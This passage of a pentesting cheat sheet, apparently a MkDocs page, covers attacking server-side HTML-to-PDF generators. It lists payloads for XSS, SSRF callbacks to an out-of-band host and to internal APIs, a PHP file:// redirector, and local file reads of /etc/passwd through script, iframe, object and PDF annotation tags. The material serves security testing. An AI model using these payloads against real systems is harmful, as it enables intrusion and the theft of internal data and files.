+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h3 id="ssrf">SSRF</h3>
+<ul>
+<li>Test for SSRF by sending requests to a server we control with one of the following
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1&quot;</span><span class="p">/&gt;</span>
+</span><span id="__span-8-2"><span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2&quot;</span> <span class="p">&gt;</span>
+</span><span id="__span-8-3"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest3&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>If the generated PDF displays the HTTP response from our server we have a regular SSRF vulnerability and we can extract data by making calls to internal API's
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://127.0.0.1:8080/api/users&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;800&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;500&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>If the PDF does not display the response we can test if it does after redirct</li>
+<li>Save the following as redirector.php
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><span class="cp">&lt;?php</span> <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: file://&#39;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>Then send the following request (this really comes under LFI)
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://&lt;server IP&gt;:8000/redirector.php?url=%2fetc%2fpasswd&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;800&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;500&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h3 id="local-file-inclusion">Local File Inclusion</h3>
+<ul>
+<li>Test for LFI with base64 encoding to avoid errors
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-12-2"><span class="w">    </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span><span id="__span-12-3"><span class="w">    </span><span class="nx">x</span><span class="p">.</span><span class="nx">onload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(){</span>
+</span><span id="__span-12-4"><span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">))</span>
+</span><span id="__span-12-5"><span class="w">    </span><span class="p">};</span>
+</span><span id="__span-12-6"><span class="w">    </span><span class="nx">x</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;file:///etc/passwd&quot;</span><span class="p">);</span>
+</span><span id="__span-12-7"><span class="w">    </span><span class="nx">x</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span><span id="__span-12-8"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>We can still test for LFI if the JS is not executed purely with HTML tags
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;file:///etc/passwd&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;800&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;500&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</span><span id="__span-13-2"><span class="p">&lt;</span><span class="nt">object</span> <span class="na">data</span><span class="o">=</span><span class="s">&quot;file:///etc/passwd&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;800&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;500&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-13-3"><span class="p">&lt;</span><span class="nt">portal</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;file:///etc/passwd&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;800&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;500&quot;</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h4 id="annotations">Annotations</h4>
+<ul>
+<li>Some PDF generation libraries (mPDF pre version 6.0, PD4ML) support annotations or attachments</li>
+<li>The following will append the LFI to the PDF
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><span class="p">&lt;</span><span class="nt">annotation</span> <span class="na">file</span><span class="o">=</span><span class="s">&quot;/etc/passwd&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;/etc/passwd&quot;</span> <span class="na">icon</span><span class="o">=</span><span class="s">&quot;Graph&quot;</span> <span class="na">title</span><span class="o">=</span><span class="s">&quot;LFI&quot;</span> <span class="p">/&gt;</span>
+</span><span id="__span-14-2"><span class="p">&lt;</span><span class="nt">pd4ml:attachment</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;/etc/passwd&quot;</span> <span class="na">description</span><span class="o">=</span><span class="s">&quot;LFI&quot;</span> <span class="na">icon</span><span class="o">=</span><span class="s">&quot;Paperclip&quot;</span><span class="p">/&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["content.code.copy"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
